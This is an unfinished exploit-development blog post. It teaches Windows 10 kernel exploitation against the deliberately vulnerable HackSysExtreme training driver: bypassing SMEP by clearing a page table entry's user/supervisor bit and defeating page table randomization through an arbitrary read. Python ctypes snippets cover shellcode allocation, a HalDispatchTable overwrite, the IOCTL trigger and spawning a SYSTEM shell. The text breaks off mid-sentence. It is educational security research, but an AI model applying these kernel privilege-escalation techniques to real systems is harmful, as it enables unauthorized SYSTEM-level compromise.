---
title:  "(UNDER CONSTRUCTION) Exploit Development: Leveraging Page Table Entries for Windows Kernel Exploitation"
date:   2020-05-02
tags: [posts]
excerpt: "Exploiting page table entries through arbitrary read/write primitives to circumvent SMEP, no-execute (NX) in the kernel, and page table randomization"
---
Introduction
---

Taking the prerequisite knowledge from my [last blog post](https://connormcgarr.github.io/paging/), let's talk about additional ways to bypass [SMEP](https://en.wikipedia.org/wiki/Supervisor_Mode_Access_Prevention) other than [flipping the 20th bit of the CR4 register](https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/)- or completely circumventing SMEP all together by bypassing [NX](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/no-execute-nonpaged-pool) in the kernel! This blog post in particular will leverage page table entry control bits to bypass these kernel mode mitigations, as well as leveraging additional vulnerabilities such as an arbitrary read to bypass page table randomization to achieve said goals.

Before We Begin
---

[Morten Schenk](https://twitter.com/blomster81?lang=en) of Offensive Security has done a lot of the leg work for shedding light on this topic to the public, namely at [DefCon 25](https://www.defcon.org/html/defcon-25/dc-25-index.html) and [Black Hat 2017](https://www.blackhat.com/us-17/).

Although there has been some _AMAZING_ research on this, I have not seen much in the way of _practical_ blog posts showcasing this technique in the wild (that is, taking an exploit start to finish leveraging this technique in a blog post). Most of the research surrounding this topic, although absolutely brilliant, only explains how these mitigation bypasses work. This led to some issues for me when I started applying this research into actual exploitation, as I only had theory to go off of.

Since I had some trouble implementing said research into a practical example, I'm writing this blog post in hopes it will aid those looking for more detail on how to leverage these mitigation bypasses in a practical manner.

This blog post is going to utilize the [HackSysExtreme](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/tree/v2.0.0/Driver) vulnerable kernel driver to outline bypassing SMEP and bypassing NX in the kernel. The vulnerability class will be an arbitrary read/write primitive, which can write one QWORD to kernel mode memory per [IOCTL](https://docs.microsoft.com/en-us/windows/win32/devio/device-input-and-output-control-ioctl-) routine.

Thank you to Ashfaq of HackSysTeam for this driver!

In addition to said information, these techniques will be utilized on a Windows 10 64-bit RS1 build. This is because Windows 10 RS2 has kernel Control Flow Guard (kCFG) enabled by default, which is beyond the scope of this post. This post simply aims to show the techniques used in today's "modern exploitaiton era" to bypass SMEP or NX in kernel mode memory.

Why Go to the Mountain, If You Can Bring the Mountain to You?
---

The adage for the title of this section, comes from Spencer Pratt's [WriteProcessMemory() white paper](https://www.exploit-db.com/papers/13660) about bypassing DEP. This saying, or adage, is extremely applicable to the method of bypassing SMEP through PTEs.

Let's start with some psuedo code!

```python
# Allocating user mode code
payload = kernel32.VirtualAlloc(
    c_int(0),                         # lpAddress
    c_int(len(shellcode)),            # dwSize
    c_int(0x3000),                    # flAllocationType
    c_int(0x40)                       # flProtect
)

---------------------------------------------------------

# Grabbing HalDispatchTable + 0x8 address
HalDispatchTable+0x8 = NTBASE + 0xFFFFFF

# Writing payload to HalDispatchTable + 0x8
www.What = payload
www.Where = HalDispatchTable + 0x8

---------------------------------------------------------

# Spawning SYSTEM shell
print "[+] Enjoy the NT AUTHORITY\SYSTEM shell!!!!"
os.system("cmd.exe /K cd C:\\")
```

> Note, the above code is syntactically incorrect, but it is there nonetheless to help us understand what is going on.

Also, before moving on, write-what-where = arbitrary memory overwrite = arbitrary write primitive.

Carrying on, the above psuedo code snippet is allocating virtual memory in user mode, via [VirtualAlloc()](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc). Then, utilizing the write-what-where vulnerability in the kernel mode driver, the shellcode's virtual address (resides in user mode), get's written to `nt!HalDispatchTable+0x8` (resides in kernel mode), which is a very common technique to use in an arbitrary memory overwrite situation.

Please refer to my [last post](https://connormcgarr.github.io/Kernel-Exploitation-2/) on how this technique works.

As it stands now, execution of this code will result in an `ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY` [Bug Check](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/bug-check-code-reference2). This Bug Check is indicative of SMEP kicking in.

Letting the code execute, we can see this is the case.

Here, we can clearly see our shellcode has been allocated at `0x2620000`

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_2.png" alt="">

SMEP kicks in, and we can see the offending address is that of our user mode shellcode (`Arg2` of `PTE contents` is highlighted as well. We will circle back to this in a moment).

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_1.png" alt="">

Recall, from a [previous blog](https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/) of mine, that SMEP kicks in whenever code that resides in current privilege level (CPL 3) of the CPU (CPL 3 code = user mode code) is executed in context of CPL 0 (kernel mode).

SMEP kicks in this case, as we are attempting to access the shellcode's virtual address in user mode from `nt!HalDispatchTable+0x8`, which is in kernel mode.

But _HOW_ is SMEP implemented is the real question. 

SMEP is enforced in two ways.

The first is globally, SMEP is mandated on the OS through the 20th bit of the CR4 control register.

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_4.png" alt="">

The 20th bit in the above image refers to the `1` in the beginning of CR4 register's value of `0x170678`, meaning SMEP is enabled on this system globally.

However, there is a second way SMEP is enforced- and that is on a per memory page basis, via the `U/S` PTE control bit. This is what we are going shit our focus to in this post.

[Alex Ionescu](https://twitter.com/aionescu) gave a [talk](https://web.archive.org/web/20180417030210/http://www.alex-ionescu.com/infiltrate2015.pdf) at Infiltrate 2015 about the implementation of SMEP on a per page basis.

Citing his slides, he explains that Intel has the following to say about SMEP enforcement on a per page basis.

> "Any page level marked as supervisor (U/S=0) will result in treatment as supervisor for SMEP enforcement."

Let's take a look at the output of `!pte` in WinDbg of our user mode shellcode page to make sense of all of this!

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_3.png" alt="">

What Intel means by the their statement in Alex's talk, is that only ONE of the paging structure table entry (a page table entry) is needed to be set to kernel, in order for SMEP to not trigger. We do not need all 4 entries to be supervisor (kernel) mode!

This is wonderful for us, from an exploit development standpoint- as this _GREATLY_ reduces our workload (we will see why shortly)!

Let's learn how we can leverage this new knowledge, by first examining the current PTE control bits of our shellcode page:

1. `D`- The "dirty" bit has been set, meaning a write to this address has occured (`KERNELBASE!VirtualAlloc()`).
2. `A`- The "access" bit has been set, meaning this address has been referenced at some point.
3. `U`- The "user" bit has been set here. When the memory manager unit reads in this address, it recognizes is as a user mode address. When this bit is 1, the page is user mode. When this bit is clear, the page is kernel mode.
4. `W`- The "write" bit has been set here, meaning this memory page is writeable.
5. `E`- The "executable" bit has been set here, meaning this memory page is executable.
6. `V`- The "valid" bit is set here, meaning that the PTE is a valid PTE.

Notice that most of these control bits were set with our call earlier to `KERNELBASE!VirtualProtect()` in the psuedo code snippet via the function's arguments of `flAllocationType` and `flProtect`.

Where Do We Go From Here?
---
Let's shift our focus to the PTE entry from the `!pte` command output in the last screenshot. We can see that our entry is that of a user mode page, from the `U/S` bit being set. However, what if we cleared this bit out? 

If the `U/S` bit is set to 0, the page should become a kernel mode page, based on the aforementioned information. Let's investigate this in WinDbg.

Rebooting our machine, we reallocate our shellcode in user mode.

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_5.png" alt="">

The above image performs the following actions:

1. Shows our shellcode in a user mode allocation at the virtual address `0xc60000`
2. Shows the current PTE and control bits for our shellcode memory page
3. Uses `ep` in WinDbg to overwrite the pointer at `0xFFFFF98000006300` (this is the address of our PTE. When dereferenced, it contains the actual PTE control bits)
4. Clears the PTE control bit for `U/S` by subtracting `4` from the PTE control bit contents.
> Note, I found this to be the correct value through trial and error.

After the `U/S` bit is cleared out, our exploit continues by overwriting `nt!HalDispatchTable+0x8` with the pointer to our shellcode.

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_6.png" alt="">

The exploit continues, with a call to `nt!KeQueryIntervalProfile`, which in turn, calls `nt!HalDispatchTable+0x8`

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_7.png" alt="">

Stepping into the `call qword ptr [nt!HalDispatchTable+0x8]` instruction, we have hit our shellcode address and it has been loaded into RIP!

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_8.png" alt="">

Exeucting the shellcode, results in manual bypass of SMEP!

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_9a.png" alt="">

Let's refer back to the phraseology earlier in the post that said:

? Why go to the mountain, if you can bring the mountain to you?

Notice how we didn't "disable" SMEP like we did a few blog posts ago with ROP. All we did this time was just play by SMEP's rules! We didn't go to SMEP and try to disable it, instead, we brought our shellcode to SMEP and said "treat this as you normally treat kernel mode memory."

This is great, we know we can bypass SMEP through this method! But the quesiton remains, how can we achieve this dynamically?

After all, we cannot just arbitrarily use WinDbg when exploiting other systems.

Calculating PTEs
---

The previously shown method of bypassing SMEP manually in WinDbg revolved around the fact we could dereference the PTE address of our shellcode page in memory and extract the control bits. The question now remains, can we do this dynamically without a debugger?

Our exploit not only gives us the ability to arbitrarily write, but it gives us the ability to arbitrarily read in data as well! We will be using this read primitive to our advantage.

Windows has an API for just about anything! Fetching the PTE for an associated virtual address is no different. Windows has an API called `nt!MiGetPteAddress` that performs a specific formula to retrieve the associated PTE of a memory page.

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_10.png" alt="">

The above function performs the following instructions:

1. Bitwise shifts the contents of the RCX register to the right by 9 bits
2. Moves the value of `0x7FFFFFFFF8` into RAX
3. Bitwise AND's the values of RCX and RAX together
4. Moves the value of `0xFFFFFE0000000000` into RAX
5. Adds the values of RAx and RCX
6. Performs a return out of the function

Let's take a second to break this down by importance. First things first, the number `0xFFFFFE0000000000` looks like it could potentially be important- as it resembles a 64-bit virtual memory address.

Turns out, this is important. This number is actually a memory address, and it is the base address of all of the PTEs! Let's talk about the base of the PTEs for a second and its significance.

Rebooting the machine and disassembling the function again, we notice something.

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_11.png" alt="">

`0xFFFFFE0000000000` has now changed to `0xFFFF800000000000`. The base of the PTEs has changed, it seems.

This is due to page table randomization, a mitigation of Windows 10. Microsoft _definitely_ had the right idea to implement this mitigation, but it is not much of a use to be honest if the attacker already has an abitrary read primtive.

An attacker needs an arbitrary read primtive in the first place to extract the contents of the PTE control bits by dereferencing the PTE of a given memory page.

If an attacker already has this ability, the adversary could just use the same primitive to read in `nt!MiGetPteAddress+0x13`, which, when dereferenced, contains the base of the PTEs.

Again, not ripping on Microsoft- I think they honestly have some of the best default OS exploit mitigations in the business. Just something I thought of.

The method of reusing an arbitrary read primitive is actually what we are going to do here! But before we do, let's talk about the PTE formula one last time.

As we saw, a bitwise shift right operation is performed on the contents of the RCX register. That is because when this function is called, the virtual address for the PTE you would like to fetch gets loaded into RCX.

We can mimic this same behavior in Python also!

```python
# Bitwise shift shellcode virtual address to the right 9 bits
shellcode_pte = shellcode_virtual_address >> 9

# Bitwise AND the bitwise shifted right shellcode virtual address with 0x7ffffffff8
shellcode_pte &= 0x7ffffffff8

# Add the base of the PTEs to the above value (which will need to be previously extracted with an arbitrary read)
shellcode_pte += base_of_ptes
```

The variable `shellcode_pte` will now contain the PTE for our shellcode page! We can demonstrate this behavior in WinDbg.

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_12.png" alt="">

Sorry for the poor screenshot above in advance.

But as we can see, our version of the formula works- and we know can now dynamically fetch a PTE address! The only question remains, how do we dynamically dereference `nt!MiGetPteAddress+0x13` with an arbitrary rea?

Read, Read, Read!
---

To use our arbitrary read, we are actually going to use our arbitrary write!

Our write-what-where primitive allows us to write a pointer (the what) to a pointer (the where). The school of thought here, is to write the address of `nt!MiGetPteAddress+0x13` (the what) to a [c_void_p](https://docs.python.org/3/library/ctypes.html#ctypes.c_void_p) data type, which is Python's representation of a C void pointer.

What will happen here is the following:

1. Since the write portion of the write-what-where writes a POINTER (a.k.a the write will take a memory address and dereference it- which results in extracting the contents of a pointer), we will write the value of `nt!MiGetPteAddress+0x13` somewhere we control. The write primitive will extract what `nt!MiGetPteAddress+0x13` points to, which is the base of the PTEs, and write it somewhere we can fetch the result!
2. The "where" value in the write-what-were vulnerability will write the "what" value (base of the PTEs) to a pointer (a.k.a if the "what" value (base of the PTEs) gets written to `0xFFFFFFFFFFFFFFFF`, that means `0xFFFFFFFFFFFFFFFF` will now POINT to the "what" value, which is the base of the PTEs).

The thought process here is, if we write the base of the PTEs to OUR OWN pointer that we create- we can then dereference our pointer and extract the contents ourselves!

Here is how this all looks in Python!

First, we declare a structure (one member for the what value, one member for the where value)

```python
# Fist structure, for obtaining nt!MiGetPteAddress+0x13 value
class WriteWhatWhere_PTE_Base(Structure):
    _fields_ = [
        ("What_PTE_Base", c_void_p),
        ("Where_PTE_Base", c_void_p)
    ]
```

Secondly, we fetch the memory address of `nt!MiGetPteAddress+0x13`
> Note- your offset from the kernel base to this function may be different!

```python
# Retrieving nt!MiGetPteAddress (Windows 10 RS1 offset)
nt_mi_get_pte_address = kernel_address + 0x51214

# Base of PTEs is located at nt!MiGetPteAddress + 0x13
pte_base = nt_mi_get_pte_address + 0x13
```

Thirdly, we declare a `c_void_p()` to store the value pointed to by `nt!MiGetPteAddress+0x13`

```python
# Creating a pointer in which the contents of nt!MiGetPteAddress+0x13 will be stored in to
# Base of the PTEs are stored here
base_of_ptes_pointer = c_void_p()
```

Fourthly, we create our structure with our "what" value and our "where" value which writes what the actual address of `nt!MiGetPteAddress+0x13` points to (the base of the PTEs) into our declared pointer.

```python
# Write-what-where structure #1
www_pte_base = WriteWhatWhere_PTE_Base()
www_pte_base.What_PTE_Base = pte_base
www_pte_base.Where_PTE_Base = addressof(base_of_ptes_pointer)
www_pte_pointer = pointer(www_pte_base)
```

Then, we make an IOCTL call to the routine that jumps to the arbitrary write in the driver.

```python
# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_pte_pointer,                    # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)
```

A little Python ctypes magic here on dereferencing pointers.

```python
# CTypes way of dereferencing a C void pointer
base_of_ptes = struct.unpack('<Q', base_of_ptes_pointer)[0]
```

The above snippet of code will read in the `c_void_p()` (which contains the base of the PTEs) and store it in the variable `base_of_ptes`.

Utilizing the base of the PTEs, we can now dynamically retrieve the location of our shellcode's PTE by putting all of the code together! We have successfully defeated page table randomization!

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_13aaaaa.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_LEAK.png" alt="">

Read, Read, Read... Again!
---

Now that we have dynamically resolved 
